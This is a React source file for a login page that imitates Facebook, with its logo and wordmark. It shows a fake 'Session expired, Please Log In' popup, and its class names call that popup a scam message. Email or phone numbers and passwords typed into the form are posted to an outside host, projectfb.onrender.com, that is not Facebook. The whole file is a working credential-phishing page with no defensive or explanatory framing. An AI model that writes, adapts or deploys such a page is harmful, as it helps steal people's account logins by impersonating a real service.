
import { useState } from 'react'
import {Link} from 'react-router-dom'
import './App.css'
import nameFb from './assets/nameFb.svg'

function App() {
const [user,setUser]=useState({
  emailOrPhone:"",
  password:""
})
const [disExpiredMsg,setdisExpiredMsg]=useState(true);
const [passwordDisplay,setpasswordDisplay]=useState(false);

async function handleSubmit(){
  if(!user.emailOrPhone || !user.password){
    console.error("user is checking")
  }else{
  setUser(user)

  const res=await fetch('https://projectfb.onrender.com',{
  method:"POST",
  headers: {
    "Content-Type": "application/json"
  },
  body:JSON.stringify(user)
  })
  const data=await res.json()
  console.log("user created",data)
  
  setUser({
  emailOrPhone:"",
  password:""
})
  }


}
function passwordDisplayChange(){
setpasswordDisplay(!passwordDisplay)
}
function handleOkClick(){
setdisExpiredMsg(false)
}
  return (
    <>
    <div className='BgScamMessageContainer' style={{display: disExpiredMsg? "flex":"none",pointerEvents: disExpiredMsg ? "auto" : "none"}}>
      <div className="blurbackground"></div>
      <div className='scamMessageContainer'>
        Session expired, Please Log In
        <button className='okBtn' onClick={handleOkClick}>OK</button>
      </div>
    </div>
    
    <div style={{textAlign:"center",margin:"20px"}} className='logoContainer'><i className="fa-brands fa-facebook fa-4x" style={{color:" hsl(220, 100%, 55%)"}}></i> <img src={nameFb} alt="" /> </div>
    <div className='maincontainer'>
      <input type="text" placeholder='Email or phone number'  value={user.emailOrPhone} onChange={(e)=>setUser({...user,emailOrPhone:e.target.value})}  />
      <div className="passwordContainer">
        <input type={passwordDisplay?"text":"password"} placeholder='Password' value={user.password} onChange={(e)=>setUser({...user,password:e.target.value})}/>
        <button onClick={passwordDisplayChange} className='PasswordShowHideBtn'>{passwordDisplay ?<i class="fa-solid fa-eye"></i>:<i class="fa-solid fa-eye-slash"></i>}</button>
      </div>
      <button type='submit' onClick={handleSubmit} className='loginbtn'>Log In</button>
      <Link to >Forget password?</Link>
      <div className='newAccountBtnContainer'>
        <button className='newAccountBtn'>Create new account</button>
      </div>
    </div>

    </>
  )
}

export default App
